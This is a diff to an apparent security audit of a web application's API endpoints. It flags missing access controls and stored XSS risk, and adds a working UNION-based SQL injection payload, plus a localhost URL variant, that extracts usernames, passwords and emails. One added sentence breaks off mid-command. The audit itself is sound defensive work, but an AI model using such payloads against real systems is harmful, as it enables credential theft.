@@ -56,11 +56,22 @@ SELECT, INSERT, both prepared.
 
 Unknown use for this endpoint. Very sensitive, shows passwords in plain
 
-> :fire: **Critical:** A1: Accessing API with missing access controls for POST, PUT and DELETE. This endpoint has no user validation, therefore anyone can view all users as long as they make a request to this endpoint. This exposes userid, username, email, contact, type, profile_pic_url, created_at. These even include the admin users and therefore VERTICAL PRIVILEGE ESCALATION!!!
+> :fire: **Critical:** A1: Accessing API with missing access controls for POST, PUT and DELETE. This endpoint has no user validation, therefore anyone can view all users as long as they make a request to this endpoint. 
+
+This exposes userid, username, email, contact, type, profile_pic_url, created_at. These can then tell malicious third parties who the admins are. Risk of vertical privilege escalation is increased. A demonstration of this vulnerability can be done by running ./
 
 ### 11. GET /users/:id
 ### 14. GET /category
 ### 16. GET /product/:id
+
+> :fire: **Critical:** A3: SQLi
+
+Payload: 
+```sql
+8 OR 1=1 GROUP BY p.productid UNION SELECT u.username, u.password, u.type, u.email, null, null, null, null, null, p.productid, table_schema, table_name FROM INFORMATION_SCHEMA.TABLES, user u, product p
+```
+
+http://localhost:8081/product/8%20GROUP%20BY%20p.productid%20UNION%20SELECT%20null,%20null,%20null,%20null,%20null,%20null,%20null,%20null,%20null,%20p.productid,%20table_schema,%20table_name%20FROM%20INFORMATION_SCHEMA.TABLES,%20product%20p
 ### 19. GET /product/:id/reviews
 > :warning: **Caution:** No output sanitisation, risk is displaying stored XSS
 
